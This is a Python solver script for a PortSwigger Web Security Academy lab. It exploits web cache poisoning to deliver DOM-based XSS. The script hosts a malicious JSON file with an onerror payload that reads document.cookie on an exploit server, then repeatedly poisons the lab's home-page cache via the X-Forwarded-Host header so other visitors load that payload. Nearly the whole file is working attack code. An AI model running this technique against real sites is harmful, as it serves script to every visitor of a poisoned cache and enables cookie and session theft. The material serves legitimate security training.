#!/usr/bin/env python3
"""
Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria
PortSwigger Web Security Academy -- Web Cache Poisoning

Companion script for the writeup: 10-dom-xss-strict-cacheability.md

What this does:
    Hosts a malicious geolocate.json on the exploit server (CORS-enabled,
    with an <img onerror=...> DOM-XSS payload in its "country" field), then
    poisons the home page cache with X-Forwarded-Host pointed at that
    exploit server -- X-Forwarded-Host feeds directly into the data.host
    value the page's inline script fetches JSON from and innerHTML-injects.
    The cache here refuses to store any response carrying Set-Cookie, so
    this script relies on httpx's persistent cookie jar (a single client
    used for every request) to make sure the session cookie is already
    established before the poisoning requests are sent -- exactly what a
    real second page load would do.

Usage:
    python 10-dom-xss-strict-cacheability.py <lab-url> [exploit-server-url]
    e.g. python 10-dom-xss-strict-cacheability.py https://0a1b...web-security-academy.net https://exploit-0a1c....exploit-server.net

    If exploit-server-url is omitted, the script tries to auto-discover it
    from the lab's home page (PortSwigger prints it there for convenience).

Requirements:
    pip install httpx
"""

import asyncio
import json
import re
import sys
from urllib.parse import urlparse
import httpx


async def _lab_solved(client: httpx.AsyncClient, url: str) -> bool:
    r = await client.get(url)
    return "congratulations" in r.text.lower() or "is-solved" in r.text.lower()


async def exploit_server_store(client: httpx.AsyncClient, exploit_server: str,
                                file_path: str, body: str,
                                head: str = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8") -> bool:
    store_url = f"{exploit_server.rstrip('/')}/store"
    data = {
        "urlIsHttps": "on",
        "responseFile": file_path,
        "responseHead": head,
        "responseBody": body,
    }
    r = await client.post(store_url, data=data, follow_redirects=True)
    verify = await client.get(f"{exploit_server.rstrip('/')}{file_path}")
    if verify.status_code == 200 and body in verify.text:
        return True
    return body[:20] in verify.text if verify.text else False


async def solve(lab_url: str, exploit_server: str = "") -> None:
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as client:
        if not exploit_server:
            r = await client.get(lab_url)
            m = re.search(r'(https?://exploit[-\w.]+\.exploit-server\.net)', r.text)
            if m:
                exploit_server = m.group(1)
            else:
                print("[-] Exploit server URL not found on the page -- pass it explicitly")
                return

        exploit_host = urlparse(exploit_server).hostname
        print(f"[+] Exploit server: {exploit_server}")

        # Step 1: store the malicious JSON with the required CORS header.
        xss_payload = "<img src=1 onerror=alert(document.cookie)>"
        malicious_json = json.dumps({"country": xss_payload})
        stored = await exploit_server_store(
            client, exploit_server,
            file_path="/resources/json/geolocate.json",
            body=malicious_json,
            head="HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin: *",
        )
        if not stored:
            print("[-] Failed to store JSON on exploit server -- cannot proceed")
            return
        print("[+] Malicious JSON stored on exploit server")

        # Step 2: poison the home page. Reusing this same client for every
        # request matters -- its cookie jar carries the session cookie
        # established on the very first request above, which is what makes
        # these responses eligible for caching at all (no Set-Cookie header).
        print("[*] Poisoning home page with X-Forwarded-Host + re-poison loop...")
        for cycle in range(40):
            r = await client.get(lab_url, headers={"X-Forwarded-Host": exploit_host})
            x_cache = r.headers.get("x-cache", "N/A")
            data_match = re.search(r'"host":"([^"]+)"', r.text)
            host_val = data_match.group(1) if data_match else "N/A"

            if x_cache.lower() == "miss" and exploit_host in host_val:
                print(f"    Cycle {cycle + 1}: POISONED (miss, host={host_val})")

            if await _lab_solved(client, lab_url):
                print("[+] Lab solved.")
                return
            await asyncio.sleep(3)

    print("[-] Not solved after re-poison loop")


if __name__ == "__main__":
    if len(sys.argv) not in (2, 3):
        print(f"Usage: python {sys.argv[0]} <lab-url> [exploit-server-url]")
        sys.exit(1)
    exploit_server_arg = sys.argv[2].rstrip("/") if len(sys.argv) == 3 else ""
    asyncio.run(solve(sys.argv[1].rstrip("/"), exploit_server_arg))
